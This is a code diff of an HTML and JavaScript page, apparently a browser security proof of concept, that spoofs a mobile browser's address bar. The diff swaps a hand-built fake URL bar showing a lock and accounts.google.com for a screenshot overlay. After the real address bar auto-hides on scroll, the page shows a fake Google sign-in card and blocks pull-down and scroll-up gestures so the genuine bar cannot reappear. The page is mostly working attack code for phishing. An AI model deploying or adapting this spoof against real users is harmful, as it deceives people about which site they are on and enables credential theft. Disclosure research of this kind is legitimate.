@@ -6,9 +6,8 @@
 <title>Security Research Proof of Concept - Omnibox Lock & UI Spoofing</title>
 <style>
     :root {
-        --primary-color: #1a73e8;
-        --bg-color: #f8f9fa;
-        --text-color: #202124;
+        --bg-color: #202124;
+        --text-color: #e8eaed;
     }
 
     * {
@@ -18,7 +17,7 @@
     body {
         margin: 0;
         padding: 0;
-        height: 4000px; /* Cukup panjang untuk memicu auto-hide omnibox */
+        height: 4000px; /* Panjang halaman untuk memicu auto-hide omnibox */
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         background-color: var(--bg-color);
         color: var(--text-color);
@@ -32,67 +31,47 @@
     }
 
     .instructions h1 {
-        font-size: 22px;
-        color: #d93025;
+        font-size: 20px;
+        color: #f28b82;
         margin-bottom: 10px;
     }
 
     .instructions p {
-        font-size: 15px;
-        color: #5f6368;
+        font-size: 14px;
+        color: #9aa0a6;
         line-height: 1.5;
     }
 
-    /* Fake Omnibox / Top Bar Overlay yang meniru struktur asli */
+    /* Fake Omnibox Overlay menggunakan gambar asli screenshot (22261.jpg) */
     #fakeOmnibox {
         position: fixed;
         top: 0;
         left: 0;
         width: 100%;
-        height: 56px;
-        background: #ffffff;
-        display: none;
-        align-items: center;
-        justify-content: space-between;
-        padding: 0 16px;
-        z-index: 999999;
-        box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-        border-bottom: 1px solid #dfe1e5;
-    }
-
-    .fake-url-bar {
-        flex: 1;
-        background: #f1f3f4;
-        height: 36px;
-        border-radius: 18px;
-        display: flex;
-        align-items: center;
-        padding: 0 14px;
-        font-size: 14px;
-        color: #202124;
-        gap: 8px;
-        border: 1px solid transparent;
-    }
-
-    .fake-url-bar span {
+        height: 72px; /* Disesuaikan dengan proporsi bagian atas browser pada gambar */
         overflow: hidden;
-        white-space: nowrap;
-        text-overflow: ellipsis;
+        display: none;
+        z-index: 999999;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
     }
 
-    .lock-icon {
-        color: #137333;
-        font-size: 12px;
+    #fakeOmnibox img {
+        width: 100%;
+        display: block;
+        /* Memposisikan gambar secara presisi hanya mengambil bagian atas (bilah alamat & status bar) */
+        object-fit: cover;
+        object-position: top;
+        margin-top: 0px;
     }
 
-    /* Halaman Login/Phishing Simulasi */
+    /* Halaman Target/Phishing Simulasi di bawahnya */
     #secureView {
         position: absolute;
         left: 0;
         width: 100%;
         display: none;
-        padding-top: 80px;
-        background: #ffffff;
+        padding-top: 90px;
+        background: #202124;
         min-height: 100vh;
         z-index: 99998;
     }
@@ -102,48 +81,45 @@
         max-width: 400px;
         margin: 40px auto;
         padding: 24px;
-        background: white;
+        background: #292a2d;
         border-radius: 8px;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-        border: 1px solid #dadce0;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        border: 1px solid #3c4043;
         text-align: center;
     }
 
     .card h2 {
-        font-size: 20px;
+        font-size: 18px;
         margin-bottom: 20px;
-        color: #202124;
+        color: #e8eaed;
     }
 
     .input-field {
         width: 100%;
         padding: 12px 14px;
         margin: 8px 0 16px 0;
-        border: 1px solid #dadce0;
+        background: #202124;
+        border: 1px solid #5f6368;
+        color: white;
         border-radius: 4px;
         font-size: 16px;
         outline: none;
     }
 
     .input-field:focus {
-        border-color: var(--primary-color);
-        box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        border-color: #8ab4f8;
     }
 
     .btn-submit {
         width: 100%;
         padding: 12px;
-        background: var(--primary-color);
-        color: white;
+        background: #8ab4f8;
+        color: #202124;
         border: none;
         border-radius: 4px;
         font-size: 16px;
-        font-weight: 500;
+        font-weight: bold;
         cursor: pointer;
-    }
-
-    .btn-submit:hover {
-        background: #1557b0;
     }
 
     #statusIndicator {
@@ -151,13 +127,14 @@
         bottom: 20px;
         left: 50%;
         transform: translateX(-50%);
-        background: rgba(0,0,0,0.8);
-        color: white;
+        background: rgba(0,0,0,0.85);
+        color: #e8eaed;
         padding: 8px 16px;
         border-radius: 20px;
         font-size: 12px;
         z-index: 99999;
         pointer-events: none;
+        border: 1px solid #5f6368;
         transition: opacity 0.3s ease;
     }
 </style>
@@ -165,27 +142,24 @@
 <body>
 
 <div class="instructions" id="instructionBox">
-    <h1>Security Analysis Test</h1>
+    <h1>Security Analysis Test - Image-based Omnibox Spoof</h1>
     <p>1. Scroll down smoothly until the browser address bar automatically hides.<br>
-       2. Keep scrolling or stop briefly.<br>
-       3. The script will intercept gesture states and lock layout bounds.</p>
+       2. Stop scrolling briefly to let the script lock scroll states.<br>
+       3. The original UI is replaced seamlessly by the target screenshot asset.</p>
 </div>
 
-<!-- Fake Omnibox UI Spoofing Layer -->
+<!-- Fake Omnibox Overlay menggunakan gambar 22261.jpg -->
 <div id="fakeOmnibox">
-    <div class="fake-url-bar">
-        <span class="lock-icon">🔒</span>
-        <span>https://accounts.google.com/signin/oauth</span>
-    </div>
+    <img src="22261.jpg" alt="Fake Omnibox">
 </div>
 
-<!-- Fullscreen Intercept View -->
+<!-- Tampilan Simulasi Phishing/Login -->
 <div id="secureView">
     <div class="card">
-        <h2>Sign in to continue</h2>
-        <input type="text" class="input-field" placeholder="Email or phone" value="target_user@gmail.com">
-        <input type="password" class="input-field" placeholder="Enter your password" value="********">
-        <button class="btn-submit">Next</button>
+        <h2>Sign in with Google</h2>
+        <input type="text" class="input-field" value="victim@gmail.com">
+        <input type="password" class="input-field" value="secret_password">
+        <button class="btn-submit">Continue</button>
     </div>
 </div>
 
@@ -195,14 +169,14 @@
     let isLocked = false;
     let scrollTriggered = false;
 
-    // Deteksi aktivitas scroll awal untuk memastikan omnibox tersembunyi secara natural
+    // Deteksi scroll untuk memicu otomatisasi setelah omnibox asli tersembunyi
     window.addEventListener('scroll', function() {
         if (window.scrollY > 150 && !scrollTriggered) {
             scrollTriggered = true;
-            document.getElementById('statusIndicator').innerText = "Status: Scroll detected. Preparing lock sequence...";
+            document.getElementById('statusIndicator').innerText = "Status: Scroll detected. Locking UI bounds...";
             
-            // Timeout untuk mengaktifkan penguncian setelah 5 detik atau saat posisi pas
-            setTimeout(activateSpoofingLock, 4000);
+            // Aktivasi penguncian instan setelah jeda singkat
+            setTimeout(activateSpoofingLock, 3500);
         }
     });
 
@@ -215,25 +189,25 @@
         let indicator = document.getElementById("statusIndicator");
         let instructions = document.getElementById("instructionBox");
 
-        // Sembunyikan instruksi asli
+        // Sembunyikan instruksi panduan
         instructions.style.display = 'none';
 
-        // Set posisi konten persis di viewport saat ini untuk mencegah loncatan layout (layout shift)
+        // Sinkronisasi posisi elemen agar mulus tanpa layout shift
         secureView.style.top = currentY + "px";
         secureView.style.display = "block";
-        fakeOmnibox.style.display = "flex";
+        fakeOmnibox.style.display = "block";
 
-        indicator.innerText = "Status: UI Lock & Omnibox Spoof Active!";
-        indicator.style.background = "#d93025";
+        indicator.innerText = "Status: Image-based Omnibox Spoof Active!";
+        indicator.style.borderColor = "#f28b82";
 
-        // Mencegah scroll ulang ke atas yang biasanya memicu kemunculan omnibox asli
+        // Paksa posisi scroll agar tidak bergeser kembali
         window.scrollTo({
             top: currentY,
             behavior: 'instant'
         });
     }
 
-    // Penanganan ketat event sentuh untuk memblokir gestur tarik ke bawah (Pull-to-refresh / Show Omnibox)
+    // Pemblokiran gestur tarik ke bawah (Pull-to-refresh / Show Omnibox)
     let startY = 0;
 
     document.addEventListener("touchstart", function(e) {
@@ -246,13 +220,12 @@
         let currentY = e.touches[0].clientY;
         let deltaY = currentY - startY;
 
-        // Jika pengguna mencoba menarik layar ke bawah untuk memunculkan bilah alamat asli
+        // Blokir jika pengguna mencoba menarik layar ke bawah untuk memunculkan omnibox asli
         if (deltaY > 0) {
-            e.preventDefault(); // Blokir pemulihan UI browser
+            e.preventDefault();
         }
     }, { passive: false });
 
-    // Blokir event roda mouse / trackpad jika diuji pada mode emulation desktop
     document.addEventListener("wheel", function(e) {
         if (!isLocked) return;
         if (e.deltaY < 0) {
